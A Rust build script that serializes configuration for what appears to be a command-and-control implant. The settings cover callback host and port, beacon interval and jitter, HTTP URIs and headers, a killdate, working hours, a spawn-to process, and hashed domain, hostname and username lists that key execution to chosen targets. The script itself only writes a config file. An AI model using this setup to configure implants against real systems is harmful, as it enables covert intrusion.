//! Build script for transforming the configuration

use std::io::Write;
use std::str::FromStr;

use base64::Engine;
use sha2::Digest;

include!("src/structs.rs");

fn hash_string_list(s: &str) -> Vec<[u8; 32]> {
    s.split(",")
        .map(|value| {
            let mut h = sha2::Sha256::new();
            h.update(value.to_lowercase().as_bytes());
            h.finalize().into()
        })
        .collect()
}

fn load_config_env() -> Vec<u8> {
    let headers = option_env!("HTTP_HEADERS")
        .expect("Failed to find the 'HTTP_HEADERS' environment variable");

    let headers = base64::engine::general_purpose::STANDARD
        .decode(headers)
        .expect("Failed to base64 decode the HTTP_HEADERS");

    let headers: HashMap<&str, &str> =
        serde_json::from_slice(&headers).expect("Failed to JSON deserialize the HTTP_HEADERS");

    let profile = HttpConfigVars {
        callback_host: option_env!("HTTP_CALLBACK_HOST")
            .expect("Failed to find the 'HTTP_CALLBACK_HOST' environment variable"),

        callback_interval: option_env!("HTTP_CALLBACK_INTERVAL")
            .expect("Failed to find the 'HTTP_CALLBACK_INTERVAL' environment variable")
            .parse()
            .expect("Failed to parse the HTTP_CALLBACK_INTERVAL"),

        callback_jitter: option_env!("HTTP_CALLBACK_JITTER")
            .expect("Failed to find the 'HTTP_CALLBACK_JITTER' environment variable")
            .parse()
            .expect("Failed to parse the HTTP_CALLBACK_JITTER"),

        callback_port: option_env!("HTTP_CALLBACK_PORT")
            .expect("Failed to find the 'HTTP_CALLBACK_PORT' environment variable")
            .parse()
            .expect("Failed to parse the HTTP_CALLBACK_PORT"),

        get_uri: option_env!("HTTP_GET_URI")
            .expect("Failed to find the 'HTTP_GET_URI' environment variable"),

        headers,

        killdate: option_env!("HTTP_KILLDATE")
            .expect("Failed to find the 'HTTP_KILLDATE' environment variable")
            .parse()
            .expect("Failed to parse the HTTP_KILLDATE"),

        post_uri: option_env!("HTTP_POST_URI")
            .expect("Failed to find the 'HTTP_POST_URI' environment variable"),

        query_path_name: option_env!("HTTP_QUERY_PATH_NAME")
            .expect("Failed to find the 'HTTP_QUERY_PATH_NAME' environment variable"),
    };

    let config_data = ConfigVars {
        init_option: match option_env!("INIT_OPTION") {
            Some("thread") => InitOption::Thread,
            Some("daemonize") => InitOption::Daemonize,
            None | Some(&_) => InitOption::None,
        },

        connection_retries: option_env!("CONNECTION_RETRIES")
            .expect("Failed to find the 'CONNECTION_RETRIES' environment variable")
            .parse()
            .expect("Failed to parse the CONNECTION_RETRIES"),

        uuid: Uuid::from_str(
            option_env!("UUID").expect("Failed to find the 'UUID' environment variable"),
        )
        .expect("Failed to parse uuid"),

        working_hours_end: option_env!("WORKING_HOURS_END")
            .expect("Failed to find the 'WORKING_HOURS_END' environment variable")
            .parse()
            .expect("Failed to parse the WORKING_HOURS_END"),

        working_hours_start: option_env!("WORKING_HOURS_START")
            .expect("Failed to find the 'WORKING_HOURS_START' environment variable")
            .parse()
            .expect("Failed to parse the WORKING_HOURS_START"),

        spawn_to: option_env!("SPAWN_TO").unwrap_or_default(),

        tlsselfsigned: option_env!("TLSSELFSIGNED")
            .map(|v| v.parse().expect("Failed to parse the TLSSELFSIGNED"))
            .unwrap_or(false),

        domains: option_env!("DOMAIN_LIST")
            .map(hash_string_list)
            .unwrap_or_default(),

        hostnames: option_env!("HOSTNAME_LIST")
            .map(hash_string_list)
            .unwrap_or_default(),

        usernames: option_env!("USERNAME_LIST")
            .map(hash_string_list)
            .unwrap_or_default(),

        profile,
    };

    rmp_serde::to_vec(&config_data).expect("Failed to serialize the config")
}

fn main() {
    let out_dir = std::env::var("OUT_DIR").expect("Failed to get the 'OUT_DIR' value");
    println!("cargo:rerun-if-changed=../.config");

    let config_data = if option_env!("UUID").is_some() {
        load_config_env()
    } else {
        Vec::new()
    };

    let _ = std::fs::remove_file(format!("{}/config.bin", out_dir));

    let mut config_file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(format!("{}/config.bin", out_dir))
        .expect("Failed to open the config output file");

    config_file
        .write_all(&config_data)
        .expect("Failed to write the serialized config to the output file");
}
